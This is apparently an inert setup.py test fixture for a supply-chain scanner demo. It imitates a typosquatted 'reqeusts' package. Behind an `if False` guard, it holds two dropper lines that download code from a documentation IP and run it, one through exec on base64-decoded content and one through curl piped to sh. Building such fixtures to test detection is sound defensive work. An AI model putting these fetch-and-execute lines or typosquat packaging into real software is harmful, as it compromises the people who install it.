"""
INERT TEST FIXTURE: a simulated malicious package for the Supplyx CI demo.

Nothing in this file does anything harmful. The "payload" below sits behind
`if False` and never runs, and 198.51.100.7 is a reserved documentation
address (RFC 5737) that routes nowhere. It exists only so that a scanner
reading this file sees the same patterns a real install-time dropper has.
"""
import base64
import subprocess
import urllib.request

from setuptools import setup

if False:  # never executes
    exec(base64.b64decode(urllib.request.urlopen("http://198.51.100.7/stage2").read()))
    subprocess.run("curl -s http://198.51.100.7/x.sh | sh", shell=True)

setup(name="reqeusts", version="9.9.9", packages=["reqeusts"])
